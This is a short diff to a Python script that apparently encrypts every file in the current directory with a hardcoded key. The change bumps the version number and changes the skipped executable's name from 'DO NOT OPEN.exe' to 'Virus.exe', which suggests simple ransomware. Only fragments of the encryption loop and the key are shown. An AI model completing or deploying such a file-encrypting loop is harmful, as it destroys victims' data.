@@ -7,7 +7,7 @@ The script encrypts and decrypts target files'
 """
 
 _author_ = "Victor Marquez"
-_version_ =0.4
+_version_ =0.5
 
 import os
 from pathlib import Path
@@ -49,7 +49,7 @@ path = os.getcwd()
 
 for file in detectFiles(path):
     filePath = Path(file)
-    if filePath.name =="DO NOT OPEN.exe":
+    if filePath.name =="Virus.exe":
         print()
     else:
         encryptFile(filePath,b'KqhHot6KyYoImzC4',path)
